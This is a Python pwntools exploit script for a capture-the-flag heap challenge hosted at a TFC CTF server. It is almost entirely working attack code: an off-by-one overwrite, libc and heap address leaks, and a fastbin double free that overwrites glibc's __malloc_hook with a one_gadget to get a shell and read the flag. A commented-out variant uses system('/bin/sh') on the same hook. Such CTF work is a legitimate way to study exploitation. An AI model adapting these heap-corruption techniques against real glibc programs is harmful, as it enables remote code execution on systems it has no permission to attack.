#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'challs.tfcctf.com', 31549

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall_patched 
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'.'

def create(size, chunk_data, bss_data):
    io.sendlineafter(b'Input:', b'1')
    io.sendlineafter(b'length:', str(size).encode())
    io.sendafter(b'credentials:', chunk_data)
    io.sendafter(b'credentials:', bss_data)

def show():
    io.sendlineafter(b'Input:', b'2')

def delete(idx):
    io.sendlineafter(b'Input:', b'3')
    io.sendlineafter(b'index:', str(idx).encode())

def exploit():
    global io
    io = initialize()   

    # leak libc inspired: https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627
    create(0x28, b'idc', b'idc') # 0
    create(0x28, b'idc', b'idc') # 1 -> victim
    create(0x28, b'idc', b'idc') # 2
    create(0x28, b'idc', b'idc') # 3
    create(0x28, b'idc', b'idc') # 4

    # off by one
    delete(0)
    payload = b'\x00' * 0x28 + b'\x91'
    create(0x28, payload, b'idc') # 0
    delete(1)

    # overwrite chunk #2 pointer to #1
    create(0x28, b'\n', b'\x00'*0x20 + b'\x30') # 1

    # profit
    show()
    io.recvline()
    libc.address = u64((b'\x00' + io.recv(5)).ljust(8, b'\x00')) - 0x3b4c00

    # overwrite chunk #2 pointer to #4
    delete(1)
    delete(4)
    create(0x28, b'\n', b'\x00'*0x20 + b'\xd0') # 1

    # profit
    show()
    io.recvline()
    heap = u64((b'\x00' + io.recv(5)).ljust(8, b'\x00'))

    # cleaning
    create(0x28, b'idc', b'idc') # 4

    # prepare chunks
    create(0x60, b'idc', b'idc') # 5
    create(0x60, b'idc', b'idc') # 6

    # input("pause << ")

    # ==========================
    # Attack Inspired By: https://github.com/Mithreindeir/ctf-writeups/blob/master/pico-ctf2018/contacts/ReadMe.md
    # ==========================

    # double free (fastbin dup)
    delete(5)
    delete(6)
    create(0x28, b'idc', b'\x00'*0x20+p64(heap+0xf0+0x10)) # 5 (now #6 is points to freed #5 before)
    delete(6)

    # profit
    one_gadgets = [0xc4dbf, 0xc4ddf, 0xc4de6, 0xe1fa1]
    create(0x60, p64(libc.sym['__malloc_hook']-0x8+0x5-0x20), b'idc') # 6
    create(0x60, b'idc', b'idc') # 7
    create(0x60, b'idc', b'idc') # 8
    create(0x60, b'\x00'*0x13 + p64(libc.address + one_gadgets[3]), b'idc') # 9

    delete(7) # ran out of slot to trigger one_gadget lol
    io.sendlineafter(b'Input:', b'1')
    io.sendlineafter(b'length:', b'1')

    # ==============================================================================
    # the exploit below we're able to control *next within the bins, but as explained 
    # in the above link, with fastbin there's complication as the destination
    # has to contain the size of the chunk, so we have to do some trickery
    # ==============================================================================

    # prepare chunks
    # create(0x18, b'idc1', b'idc') # 5
    # create(0x18, b'idc2', b'idc') # 6
    # create(0x18, b'idc3', b'idc') # 7

    # # off by one
    # delete(5)
    # payload = b'\x00' * 0x18 + b'\x41'
    # create(0x18, payload, b'idc') # 5

    # delete(5)
    # delete(7)
    # delete(6)

    # # overlapping chunks (#6 and #7)
    # payload = b'\x00' * 0x18 + p64(0x71) + p64(libc.sym['__malloc_hook']-0x8+0x5)
    # create(0x38, payload, b'idc') # 6

    # # profit
    # create(0x18, b'/bin/sh\x00', b'idc') # 7
    # create(0x18, b'\x00'*0x13 + p64(libc.sym['system']), b'idc') # 8

    # delete(7)

    sleep(0.2)
    io.sendline('cat flag.txt')

    log.success('libc base: %#x', libc.address)
    log.success('heap base: %#x', heap)
    io.interactive()
    
if __name__ == '__main__':
    exploit()